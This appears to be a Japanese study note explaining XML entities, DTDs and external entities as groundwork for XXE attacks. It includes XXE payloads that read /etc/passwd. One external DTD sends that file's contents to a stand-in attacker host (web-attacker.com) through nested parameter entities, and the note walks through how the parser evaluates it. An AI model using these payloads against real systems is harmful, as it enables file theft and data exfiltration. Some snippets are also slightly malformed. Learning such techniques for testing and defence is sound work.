###### Summery

- 通常のエンティティ定義
```dtd
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
```
- 通常のエンティティの参照
```
&xxe;
```

- DTD内でのみ参照させる外部エンティティ(外部リソースが値）をパラメータエンティティと呼ぶ
- パラメータエンティティは`%`を使用して定義と呼び出しする
```dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "URL or FILEpath"> %xxe; ]>
```

- エンティティの存在意義は、特殊文字のエスケープのようなもの(`<`を文字として解釈させるなど)
---

### XML とは

- eXtensible Markup Language（拡張可能なマークアップ言語）
- XMLは、データの保存と転送のために設計された言語
- JSONも同じような役割 [参考記事：XML vs JSON](https://www.w2solution.co.jp/corporate/tech/xml-vs-json/)

###### HTMLと異なる点

- HTMLはウェブページの表示を制御し、XMLは任意のデータ構造を表現することが目的
- XMLはHTMLのようにあらかじめ定義済みのタグを使用するのではない
- つまり、XMLはタグにデータを表す名前を自由につけられる。

---
### XMLエンティティとは

- エンティティとは、XML文書内でデータ項目を表現するための方法の一つで、データをそのままの形ではなく、別の方法で表現するもの
- 特殊文字(メタ文字）の表現によく使用される
- ==特殊文字を安全にデータとして扱うため、または特殊な文字（例：!や`$#`など）を表現するために使用=

- ==エンティティを参照・展開する文法==は`&entity_name;`
###### 具体例

- 以下は`<name>`をXMLタグとして解釈させてしまう
```xml
<message>Hello, how are you <name>?</message>
```

- `<name>`をXMLタグとしてではなく、単なるデータとして扱わせたい
```xml
<message>Hello, how are you &lt;name&gt;?</message>
```
- `<`:  = `&lt;`
- `>`: = `&gt;`

###### XMLエンティティ対応表

- [XML Entity References](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/dd892769(v=vs.85))

---
### DTD (Document Type Definition)とは

- `DOCTYPE`
- XMLのDTDは、XML文書の構造、XML文書が含むことのできるデータ型、およびその他の項目を定義する宣言を含む
- ==DTDでXML文書の構造を厳密に定義することができる==
- DTDは、XML文書の最初にある任意のDOCTYPE要素内で宣言

###### 内部DTDの例

- 文書内に自己完結型で存在する
```dtd
<!DOCTYPE root [
  <!ELEMENT root (element)*>
  <!ELEMENT element (#PCDATA)>
]>
<root>
  <element>Content</element>
</root>
```
###### 外部DTDの例

- 他の場所からロードされるdtdファイル
```dtd
<!DOCTYPE root SYSTEM "mydtd.dtd">
<root>
  <element>Content</element>
</root>
```

###### ハイブリッドDTDの例

-  内部と外部のDTDのハイブリッド
```dtd
<!DOCTYPE root SYSTEM "mydtd.dtd" [
  <!ELEMENT element (#PCDATA)>
]>
<root>
  <element>Content</element>
</root>
```

##### 外部DTDで定義したエンティティを内部DTDで再定義する

1. 外部DTD (mydtd.dtd) の例：
```dtd
<!ENTITY MyName "Suzuki">
```

2. 内部DTDと外部DTDのハイブリッドによる再定義の例：
```dtd
<!DOCTYPE root SYSTEM "mydtd.dtd" [
<!ENTITY MyName "Ikeda">
]>
<root>
  &MyName;
</root>
```
- 外部DTD内ではMyNameが"Suzuki"だったが、内部DTDで再定義し、その結果、XMLドキュメントの中では`&MyName;`は"Ikeda"と解釈される

---
### XMLパーサの処理順

- [[3. Blind XXE#②OASTによるBlind XXEの悪用でデータを抽出する]]
- 外部DTDの例
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

- ==基本的に上から下へ解析==していく
- ==[[#ネスト]]では内側から外側へ解析==する

1. `%file`エンティティが定義される
2. `%eval`エンティティが定義される
	- `&#x25;`としているのは、`%eval;`でエンティティ展開したときに初めて`&#x25;`が`%`と解釈されて`%exfiltrate`のエンティティ定義をするため。
	- この段階では`%file;`が展開されてしまうが、`%exfiltrate`エンティティがちゃんと定義されてないのでこの展開は取り消される。

3. `%eval;`でエンティティ展開をすると、`%exfiltrate`エンティティが定義される
4. `%exfiltrate;`でエンティティ展開すると、`%file;`が展開されて`http://web-attacker.com/?x=/etc/passwd`を参照する

###### ネスト

- エンティティの定義内に他のエンティティの参照が含まれている時、それはネストされているという。
- つまり、以下のイメージ
```
&#x25; exfitrate {
	%file;
}
```
- この時、内側から外側へ解析していく(`file` -> `exfitrate`)

---
### XMLカスタムエンティティとは

- ==XMLエンティティを自分で作ること。つまり、データをそのままの形ではなく、別の方法で表現するように自分で定義づけられる==

- DTDの中にカスタムエンティティを定義できる
```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY {entity_name} "{entity_value}"
]

```

###### カスタムエンティティの定義と展開の具体例

1. カスタムエンティティの定義
```dtd
<?xml version="1.0" encode="UTF-8"?>
<!DOCTYPE intro [
<!ENTITY MyName "Ikeda">
]
```

2. エンティティを参照する
```
私の名前は&MyName;です。
```

3. 値が展開される
```
私の名前はIkedaです
```

---
### XML外部エンティティとは

- カスタムエンティティの一種
- 簡単にいうと、==エンティティの定義時に、今現在のXML文書の外部に存在するリソースを参照しているもの== (エンティティの定義 ⊂ DTDの定義)

- ==定義方法==: `SYSTEM` + URL or filepath
```xml
<!DOCTYPE hoge [
<!ENTITY {external_entity} SYSTEM "{https://example.com OR file:///path/to/file}"
]
```
- ⚠️：`file:///etc/passwd`など。`file://` + `/etc/passwd`なので、`/`は3本になる

###### 対照: 内部エンティティ

- エンティティの定義が今現在のXML文書で行われている
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hoge [
<!ENTITY {internal_enitity} "{entity_value}"
]
```
###### 関連

- [[3. Blind XXE#💡Tips XMLパラメータエンティティの使用によるXXEブロックバイパス]]